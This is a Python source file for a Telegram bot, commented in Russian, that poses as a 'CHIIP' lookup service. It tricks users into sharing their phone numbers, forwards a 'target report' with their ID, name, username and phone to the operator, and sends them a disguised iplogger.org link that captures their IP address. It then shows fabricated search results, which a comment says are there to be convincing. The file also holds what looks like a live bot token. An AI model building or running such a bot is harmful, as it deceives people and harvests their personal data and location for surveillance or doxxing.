import logging
import os
import threading
from flask import Flask
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8531763156:AAGkTIJDVaTuKT6zIK0QYira73S8B-0qlXc' #
ADMIN_ID = 5476069446 # Твой ID для получения данных
# Ссылка на логгер для фиксации IP
LOGGER_URL = "https://iplogger.org/2u7vG5" # Замени на свою актуальную ссылку

# --- ВЕБ-СЕРВЕР ДЛЯ RENDER (HEALTH CHECK) ---
# Это нужно, чтобы Render не закрывал бота из-за отсутствия порта
app = Flask(__name__)

@app.route('/')
def health():
    return "Бот работает!", 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# --- ЛОГИКА БОТА ---
logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN, parse_mode="Markdown")
dp = Dispatcher(bot)

# Клавиатура подтверждения (Скриншот 1000006458.png)
contact_kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
contact_kb.add(KeyboardButton("✅ Подтвердить личность", request_contact=True))

# Главное меню (как на скриншоте 1000006452.png)
def get_main_menu():
    kb = InlineKeyboardMarkup(row_width=3)
    btns = [
        "Профиль", "Следить", "Имена, @теги", 
        "Группы", "Сообщения", "Анализ", 
        "Каналы", "Репутация", "Знакомые", 
        "Реакции", "Подарки", "Поделиться", 
        "Частота слов", "Общие группы"
    ]
    for text in btns:
        kb.insert(InlineKeyboardButton(text, callback_data="none"))
    return kb

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    # Текст приветствия из скриншота 1000006458.png
    await message.answer(
        "🚀 **Система CHIIP: Авторизация**\n\n"
        "Для получения доступа к закрытому функционалу необходимо подтвердить номер телефона.",
        reply_markup=contact_kb
    )

@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    contact = message.contact
    user = message.from_user
    
    # Формируем отчет для админа (Скриншоты 1000006459.png, 1000006460.png)
    report = (
        f"🕵️ **ОТЧЕТ О ЦЕЛИ**\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🆔 **ID:** `{user.id}`\n"
        f"👤 **Имя:** {user.full_name}\n"
        f"🏷 **Username:** @{user.username if user.username else 'нет'}\n"
        f"📱 **Телефон:** +{contact.phone_number}\n"
        f"🌐 **Язык:** {user.language_code}\n"
        f"💎 **Premium:** {'Да' if user.is_premium else 'Нет'}\n"
        f"━━━━━━━━━━━━━━━\n"
        f"⚠️ *Ожидайте перехода по ссылке для фиксации IP...*"
    )
    
    # Отправка тебе в личку
    await bot.send_message(ADMIN_ID, report)
    
    # Кнопка с логгером (Скриншот 1000006459.png)
    ip_kb = InlineKeyboardMarkup().add(
        InlineKeyboardButton("🔗 Завершить настройку (нажми сюда)", url=LOGGER_URL)
    )
    
    # Ответ пользователю
    await message.answer(
        "Номер подтвержден! Последний шаг: перейдите по ссылке ниже, чтобы "
        "синхронизировать устройство с сервером.", 
        reply_markup=ip_kb
    )
    
    # Сразу выдаем "фейковый" результат поиска для убедительности (Скриншот 1000006450.png)
    fake_data = (
        f"ID: {user.id}\n"
        f"usernames: @{user.username if user.username else 'id' + str(user.id)}\n"
        f"Репутация: **в основном отрицательная**\n"
        f"Сообщений в базе: 10192"
    )
    await message.answer(fake_data, reply_markup=get_main_menu())

if __name__ == '__main__':
    # 1. Запускаем Flask в отдельном потоке
    threading.Thread(target=run_flask, daemon=True).start()
    
    # 2. Запускаем бота
    executor.start_polling(dp, skip_updates=True)